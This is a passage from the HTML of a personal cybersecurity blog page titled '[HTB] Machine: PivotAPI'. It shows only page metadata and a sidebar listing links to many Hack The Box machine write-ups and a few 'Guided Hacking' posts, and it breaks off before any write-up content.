<!doctype html><html lang=en><head><title>[HTB] Machine: PivotAPI</title>
<meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><link rel=stylesheet href=/application.650f674fc19266f4ea6c7b54bb6a4ffad10dfa641e3bea6de0a8472a99807590.css integrity="sha256-ZQ9nT8GSZvTqbHtUu2pP+tEN+mQeO+pt4KhHKpmAdZA="><link rel=icon type=image/png href=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png><meta property="og:title" content="[HTB] Machine: PivotAPI"><meta property="og:description" content="[HTB] Machine: PivotAPI"><meta property="og:type" content="article"><meta property="og:url" content="https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/pivotapi/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-10-04T00:00:00+00:00"><meta property="article:modified_time" content="2023-10-04T00:00:00+00:00"><meta name=description content="[HTB] Machine: PivotAPI"></head><body class="type-posts kind-page" data-spy=scroll data-target=#TableOfContents data-offset=80><div class="container-fluid bg-dimmed wrapper"><nav class="navbar navbar-expand-xl top-navbar final-navbar shadow"><div class=container><button class="navbar-toggler navbar-light" id=sidebar-toggler type=button>
<span class=navbar-toggler-icon></span>
</button>
<a class=navbar-brand href=/><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png alt=Logo>
Personal Blog</a>
<button class="navbar-toggler navbar-light" id=toc-toggler type=button>
<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse lang-selector" id=top-nav-items><ul class="navbar-nav ml-auto"><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href=# id=themeSelector role=button data-toggle=dropdown aria-haspopup=true aria-expanded=false><img id=navbar-theme-icon-svg src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme"></a><div id=themeMenu class="dropdown-menu dropdown-menu-icons-only" aria-labelledby=themeSelector><a class="dropdown-item nav-link" href=# data-scheme=light><img class=menu-icon-center src=/icons/sun-svgrepo-com.svg width=20 alt="Light Theme">
</a><a class="dropdown-item nav-link" href=# data-scheme=dark><img class=menu-icon-center src=/icons/moon-svgrepo-com.svg width=20 alt="Dark Theme">
</a><a class="dropdown-item nav-link" href=# data-scheme=system><img class=menu-icon-center src=/icons/computer-svgrepo-com.svg width=20 alt="System Theme"></a></div></li></ul></div></div><img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=main-logo alt=Logo>
<img src=/images/logo_hub369d6c5ab3ad73350236cbc9a72876b_254257_42x0_resize_box_3.png class=d-none id=inverted-logo alt="Inverted Logo"></nav><section class=sidebar-section id=sidebar-section><div class=sidebar-holder><div class=sidebar id=sidebar><form class=mx-auto method=get action=/search><input type=text name=keyword placeholder=Search data-search id=search-box></form><div class=sidebar-tree><ul class=tree id=tree><li id=list-heading><a href=/posts/ data-filter=all>Posts</a></li><div class=subtree><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/>Cybersecurity</a><ul class=active><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/guided-hacking/>Guided Hacking</a><ul><li><a href=/posts/cybersecurity/guided-hacking/dll-injector/ title="[Guided Hacking] DLL Injector">[Guided Hacking] DLL Injector</a></li><li><a href=/posts/cybersecurity/guided-hacking/external-trainer/ title="[Guided Hacking] External Trainer">[Guided Hacking] External Trainer</a></li><li><a href=/posts/cybersecurity/guided-hacking/internal-trainer/ title="[Guided Hacking] Internal Trainer">[Guided Hacking] Internal Trainer</a></li><li><a href=/posts/cybersecurity/guided-hacking/overview/ title="[Guided Hacking] Overview">[Guided Hacking] Overview</a></li><li><a href=/posts/cybersecurity/guided-hacking/shellcode-injector/ title="[Guided Hacking] Shellcode Injector">[Guided Hacking] Shellcode Injector</a></li></ul></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/>Hackthebox</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/challenges/ title="[HTB] Challenges">[HTB] Challenges</a></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/>[HTB] Machines</a><ul class=active><li><i class="fas fa-plus-circle"></i><a href=/posts/cybersecurity/hackthebox/machines/linux/>[HTB] Linux Machines</a><ul><li><a href=/posts/cybersecurity/hackthebox/machines/linux/academy/ title="[HTB] Machine: Academy">[HTB] Machine: Academy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/admirer/ title="[HTB] Machine: Admirer">[HTB] Machine: Admirer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/agile/ title="[HTB] Machine: Agile">[HTB] Machine: Agile</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ai/ title="[HTB] Machine: AI">[HTB] Machine: AI</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/antique/ title="[HTB] Machine: Antique">[HTB] Machine: Antique</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/apocalyst/ title="[HTB] Machine: Apocalyst">[HTB] Machine: Apocalyst</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/aragog/ title="[HTB] Machine: Aragog">[HTB] Machine: Aragog</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/armageddon/ title="[HTB] Machine: Armageddon">[HTB] Machine: Armageddon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/backdoor/ title="[HTB] Machine: Backdoor">[HTB] Machine: Backdoor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bagel/ title="[HTB] Machine: Bagel">[HTB] Machine: Bagel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bank/ title="[HTB] Machine: Bank">[HTB] Machine: Bank</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bashed/ title="[HTB] Machine: Bashed">[HTB] Machine: Bashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/beep/ title="[HTB] Machine: Beep">[HTB] Machine: Beep</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bitlab/ title="[HTB] Machine: Bitlab">[HTB] Machine: Bitlab</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blocky/ title="[HTB] Machine: Blocky">[HTB] Machine: Blocky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/blunder/ title="[HTB] Machine: Blunder">[HTB] Machine: Blunder</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bolt/ title="[HTB] Machine: Bolt">[HTB] Machine: Bolt</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/book/ title="[HTB] Machine: Book">[HTB] Machine: Book</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/ title="[HTB] Machine: BountyHunter">[HTB] Machine: BountyHunter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/bucket/ title="[HTB] Machine: Bucket">[HTB] Machine: Bucket</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/busqueda/ title="[HTB] Machine: Busqueda">[HTB] Machine: Busqueda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cache/ title="[HTB] Machine: Cache">[HTB] Machine: Cache</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/canape/ title="[HTB] Machine: Canape">[HTB] Machine: Canape</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cap/ title="[HTB] Machine: Cap">[HTB] Machine: Cap</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/carrier/ title="[HTB] Machine: Carrier">[HTB] Machine: Carrier</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/celestial/ title="[HTB] Machine: Celestial">[HTB] Machine: Celestial</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/chaos/ title="[HTB] Machine: Chaos">[HTB] Machine: Chaos</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/craft/ title="[HTB] Machine: Craft">[HTB] Machine: Craft</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/cronos/ title="[HTB] Machine: Cronos">[HTB] Machine: Cronos</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/curling/ title="[HTB] Machine: Curling">[HTB] Machine: Curling</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/delivery/ title="[HTB] Machine: Delivery">[HTB] Machine: Delivery</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/devoops/ title="[HTB] Machine: DevOops">[HTB] Machine: DevOops</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/devzat/ title="[HTB] Machine: Devzat">[HTB] Machine: Devzat</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/doctor/ title="[HTB] Machine: Doctor">[HTB] Machine: Doctor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/dynstr/ title="[HTB] Machine: Dynstr">[HTB] Machine: Dynstr</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/enterprise/ title="[HTB] Machine: Enterprise">[HTB] Machine: Enterprise</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/europa/ title="[HTB] Machine: Europa">[HTB] Machine: Europa</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/explore/ title="[HTB] Machine: Explore">[HTB] Machine: Explore</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/format/ title="[HTB] Machine: Format">[HTB] Machine: Format</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/friendzone/ title="[HTB] Machine: FriendZone">[HTB] Machine: FriendZone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/frolic/ title="[HTB] Machine: Frolic">[HTB] Machine: Frolic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/fulcrum/ title="[HTB] Machine: Fulcrum">[HTB] Machine: Fulcrum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/gobox/ title="[HTB] Machine: Gobox">[HTB] Machine: Gobox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/goodgames/ title="[HTB] Machine: GoodGames">[HTB] Machine: GoodGames</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haircut/ title="[HTB] Machine: Haircut">[HTB] Machine: Haircut</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/hawk/ title="[HTB] Machine: Hawk">[HTB] Machine: Hawk</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/haystack/ title="[HTB] Machine: Haystack">[HTB] Machine: Haystack</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/help/ title="[HTB] Machine: Help">[HTB] Machine: Help</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/horizontall/ title="[HTB] Machine: Horizontall">[HTB] Machine: Horizontall</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/inception/ title="[HTB] Machine: Inception">[HTB] Machine: Inception</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/inject/ title="[HTB] Machine: Inject">[HTB] Machine: Inject</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/irked/ title="[HTB] Machine: Irked">[HTB] Machine: Irked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jarvis/ title="[HTB] Machine: Jarvis">[HTB] Machine: Jarvis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jewel/ title="[HTB] Machine: Jewel">[HTB] Machine: Jewel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/jupiter/ title="[HTB] Machine: Jupiter">[HTB] Machine: Jupiter</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/knife/ title="[HTB] Machine: Knife">[HTB] Machine: Knife</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/laboratory/ title="[HTB] Machine: Laboratory">[HTB] Machine: Laboratory</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lacasadepapel/ title="[HTB] Machine: LaCasaDePapel">[HTB] Machine: LaCasaDePapel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lame/ title="[HTB] Machine: Lame">[HTB] Machine: Lame</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/late/ title="[HTB] Machine: Late">[HTB] Machine: Late</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/lazy/ title="[HTB] Machine: Lazy">[HTB] Machine: Lazy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luanne/ title="[HTB] Machine: Luanne">[HTB] Machine: Luanne</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/luke/ title="[HTB] Machine: Luke">[HTB] Machine: Luke</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/magic/ title="[HTB] Machine: Magic">[HTB] Machine: Magic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mango/ title="[HTB] Machine: Mango">[HTB] Machine: Mango</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/metatwo/ title="[HTB] Machine: MetaTwo">[HTB] Machine: MetaTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/mirai/ title="[HTB] Machine: Mirai">[HTB] Machine: Mirai</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/monitorstwo/ title="[HTB] Machine: MonitorsTwo">[HTB] Machine: MonitorsTwo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/networked/ title="[HTB] Machine: Networked">[HTB] Machine: Networked</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nibbles/ title="[HTB] Machine: Nibbles">[HTB] Machine: Nibbles</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nineveh/ title="[HTB] Machine: Nineveh">[HTB] Machine: Nineveh</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/node/ title="[HTB] Machine: Node">[HTB] Machine: Node</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nodeblog/ title="[HTB] Machine: NodeBlog">[HTB] Machine: NodeBlog</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/nunchucks/ title="[HTB] Machine: Nunchucks">[HTB] Machine: Nunchucks</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/obscurity/ title="[HTB] Machine: Obscurity">[HTB] Machine: Obscurity</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/october/ title="[HTB] Machine: October">[HTB] Machine: October</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/olympus/ title="[HTB] Machine: Olympus">[HTB] Machine: Olympus</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/onlyforyou/ title="[HTB] Machine: OnlyForYou">[HTB] Machine: OnlyForYou</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/openadmin/ title="[HTB] Machine: OpenAdmin">[HTB] Machine: OpenAdmin</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/opensource/ title="[HTB] Machine: OpenSource">[HTB] Machine: OpenSource</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ophiuchi/ title="[HTB] Machine: Ophiuchi">[HTB] Machine: Ophiuchi</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pandora/ title="[HTB] Machine: Pandora">[HTB] Machine: Pandora</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/paper/ title="[HTB] Machine: Paper">[HTB] Machine: Paper</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/passage/ title="[HTB] Machine: Passage">[HTB] Machine: Passage</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pc/ title="[HTB] Machine: PC">[HTB] Machine: PC</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/photobomb/ title="[HTB] Machine: Photobomb">[HTB] Machine: Photobomb</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/pit/ title="[HTB] Machine: Pit">[HTB] Machine: Pit</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/popcorn/ title="[HTB] Machine: Popcorn">[HTB] Machine: Popcorn</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/postman/ title="[HTB] Machine: Postman">[HTB] Machine: Postman</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/precious/ title="[HTB] Machine: Precious">[HTB] Machine: Precious</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/previse/ title="[HTB] Machine: Previse">[HTB] Machine: Previse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ready/ title="[HTB] Machine: Ready">[HTB] Machine: Ready</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/redcross/ title="[HTB] Machine: RedCross">[HTB] Machine: RedCross</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/redpanda/ title="[HTB] Machine: RedPanda">[HTB] Machine: RedPanda</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/routerspace/ title="[HTB] Machine: RouterSpace">[HTB] Machine: RouterSpace</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/safe/ title="[HTB] Machine: Safe">[HTB] Machine: Safe</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/schooled/ title="[HTB] Machine: Schooled">[HTB] Machine: Schooled</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/scriptkiddie/ title="[HTB] Machine: ScriptKiddie">[HTB] Machine: ScriptKiddie</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/seal/ title="[HTB] Machine: Seal">[HTB] Machine: Seal</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/secret/ title="[HTB] Machine: Secret">[HTB] Machine: Secret</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sense/ title="[HTB] Machine: Sense">[HTB] Machine: Sense</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shibboleth/ title="[HTB] Machine: Shibboleth">[HTB] Machine: Shibboleth</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shocker/ title="[HTB] Machine: Shocker">[HTB] Machine: Shocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/shoppy/ title="[HTB] Machine: Shoppy">[HTB] Machine: Shoppy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sneaky/ title="[HTB] Machine: Sneaky">[HTB] Machine: Sneaky</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sneakymailer/ title="[HTB] Machine: SneakyMailer">[HTB] Machine: SneakyMailer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/soccer/ title="[HTB] Machine: Soccer">[HTB] Machine: Soccer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/socket/ title="[HTB] Machine: Socket">[HTB] Machine: Socket</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/solidstate/ title="[HTB] Machine: SolidState">[HTB] Machine: SolidState</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/spectra/ title="[HTB] Machine: Spectra">[HTB] Machine: Spectra</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/squashed/ title="[HTB] Machine: Squashed">[HTB] Machine: Squashed</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/steamcloud/ title="[HTB] Machine: SteamCloud">[HTB] Machine: SteamCloud</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/stocker/ title="[HTB] Machine: Stocker">[HTB] Machine: Stocker</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/stratosphere/ title="[HTB] Machine: Stratosphere">[HTB] Machine: Stratosphere</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/sunday/ title="[HTB] Machine: Sunday">[HTB] Machine: Sunday</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/swagshop/ title="[HTB] Machine: SwagShop">[HTB] Machine: SwagShop</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tabby/ title="[HTB] Machine: Tabby">[HTB] Machine: Tabby</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tartarsauce/ title="[HTB] Machine: TartarSauce">[HTB] Machine: TartarSauce</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/teacher/ title="[HTB] Machine: Teacher">[HTB] Machine: Teacher</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tenet/ title="[HTB] Machine: Tenet">[HTB] Machine: Tenet</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tentacle/ title="[HTB] Machine: Tentacle">[HTB] Machine: Tentacle</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/tenten/ title="[HTB] Machine: Tenten">[HTB] Machine: Tenten</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/thenotebook/ title="[HTB] Machine: TheNotebook">[HTB] Machine: TheNotebook</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/time/ title="[HTB] Machine: Time">[HTB] Machine: Time</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traceback/ title="[HTB] Machine: Traceback">[HTB] Machine: Traceback</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/traverxec/ title="[HTB] Machine: Traverxec">[HTB] Machine: Traverxec</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/trick/ title="[HTB] Machine: Trick">[HTB] Machine: Trick</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/twomillion/ title="[HTB] Machine: TwoMillion">[HTB] Machine: TwoMillion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/unattended/ title="[HTB] Machine: Unattended">[HTB] Machine: Unattended</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/unicode/ title="[HTB] Machine: Unicode">[HTB] Machine: Unicode</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/union/ title="[HTB] Machine: Union">[HTB] Machine: Union</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/valentine/ title="[HTB] Machine: Valentine">[HTB] Machine: Valentine</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/validation/ title="[HTB] Machine: Validation">[HTB] Machine: Validation</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/vault/ title="[HTB] Machine: Vault">[HTB] Machine: Vault</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/waldo/ title="[HTB] Machine: Waldo">[HTB] Machine: Waldo</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/wall/ title="[HTB] Machine: Wall">[HTB] Machine: Wall</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/writer/ title="[HTB] Machine: Writer">[HTB] Machine: Writer</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/writeup/ title="[HTB] Machine: Writeup">[HTB] Machine: Writeup</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/linux/ypuffy/ title="[HTB] Machine: Ypuffy">[HTB] Machine: Ypuffy</a></li></ul></li><li><i class="fas fa-minus-circle"></i><a class=active href=/posts/cybersecurity/hackthebox/machines/windows/>[HTB] Windows Machines</a><ul class=active><li><a href=/posts/cybersecurity/hackthebox/machines/windows/absolute/ title="[HTB] Machine: Absolute">[HTB] Machine: Absolute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/access/ title="[HTB] Machine: Access">[HTB] Machine: Access</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/active/ title="[HTB] Machine: Active">[HTB] Machine: Active</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/acute/ title="[HTB] Machine: Acute">[HTB] Machine: Acute</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/anubis/ title="[HTB] Machine: Anubis">[HTB] Machine: Anubis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/apt/ title="[HTB] Machine: APT">[HTB] Machine: APT</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/arctic/ title="[HTB] Machine: Arctic">[HTB] Machine: Arctic</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/atom/ title="[HTB] Machine: Atom">[HTB] Machine: Atom</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bankrobber/ title="[HTB] Machine: BankRobber">[HTB] Machine: BankRobber</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bart/ title="[HTB] Machine: Bart">[HTB] Machine: Bart</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastard/ title="[HTB] Machine: Bastard">[HTB] Machine: Bastard</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bastion/ title="[HTB] Machine: Bastion">[HTB] Machine: Bastion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blackfield/ title="[HTB] Machine: Blackfield">[HTB] Machine: Blackfield</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/blue/ title="[HTB] Machine: Blue">[HTB] Machine: Blue</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/bounty/ title="[HTB] Machine: Bounty">[HTB] Machine: Bounty</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/breadcrumbs/ title="[HTB] Machine: Breadcrumps">[HTB] Machine: Breadcrumps</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/buff/ title="[HTB] Machine: Buff">[HTB] Machine: Buff</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/cascade/ title="[HTB] Machine: Cascade">[HTB] Machine: Cascade</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/cerberus/ title="[HTB] Machine: Cerberus">[HTB] Machine: Cerberus</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/chatterbox/ title="[HTB] Machine: Chatterbox">[HTB] Machine: Chatterbox</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/conceal/ title="[HTB] Machine: Conceal">[HTB] Machine: Conceal</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/control/ title="[HTB] Machine: Control">[HTB] Machine: Control</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/devel/ title="[HTB] Machine: Devel">[HTB] Machine: Devel</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/driver/ title="[HTB] Machine: Driver">[HTB] Machine: Driver</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/dropzone/ title="[HTB] Machine: Dropzone">[HTB] Machine: Dropzone</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/escape/ title="[HTB] Machine: Escape">[HTB] Machine: Escape</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/flight/ title="[HTB] Machine: Flight">[HTB] Machine: Flight</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/forest/ title="[HTB] Machine: Forest">[HTB] Machine: Forest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/fuse/ title="[HTB] Machine: Fuse">[HTB] Machine: Fuse</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/giddy/ title="[HTB] Machine: Giddy">[HTB] Machine: Giddy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/grandpa/ title="[HTB] Machine: Grandpa">[HTB] Machine: Grandpa</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/granny/ title="[HTB] Machine: Granny">[HTB] Machine: Granny</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/hathor/ title="[HTB] Machine: Hathor">[HTB] Machine: Hathor</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/heist/ title="[HTB] Machine: Heist">[HTB] Machine: Heist</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/intelligence/ title="[HTB] Machine: Intelligence">[HTB] Machine: Intelligence</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jeeves/ title="[HTB] Machine: Jeeves">[HTB] Machine: Jeeves</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/jerry/ title="[HTB] Machine: Jerry">[HTB] Machine: Jerry</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/json/ title="[HTB] Machine: Json">[HTB] Machine: Json</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/legacy/ title="[HTB] Machine: Legacy">[HTB] Machine: Legacy</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/love/ title="[HTB] Machine: Love">[HTB] Machine: Love</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/mantis/ title="[HTB] Machine: Mantis">[HTB] Machine: Mantis</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/minion/ title="[HTB] Machine: Minion">[HTB] Machine: Minion</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/monteverde/ title="[HTB] Machine: Monteverde">[HTB] Machine: Monteverde</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/multimaster/ title="[HTB] Machine: Multimaster">[HTB] Machine: Multimaster</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/nest/ title="[HTB] Machine: Nest">[HTB] Machine: Nest</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/netmon/ title="[HTB] Machine: Netmon">[HTB] Machine: Netmon</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/object/ title="[HTB] Machine: Object">[HTB] Machine: Object</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/omni/ title="[HTB] Machine: Omni">[HTB] Machine: Omni</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/optimum/ title="[HTB] Machine: Optimum">[HTB] Machine: Optimum</a></li><li><a href=/posts/cybersecurity/hackthebox/machines/windows/outdated/ title="[HTB] Machine: Outdated">[HTB] Machine: Outdated</a></li><li><a class=active href=/posts/cybersecurity/hackthebox/machines/windows/pivotapi/ title="[HTB] Machine: PivotAPI">[HTB] Machine: 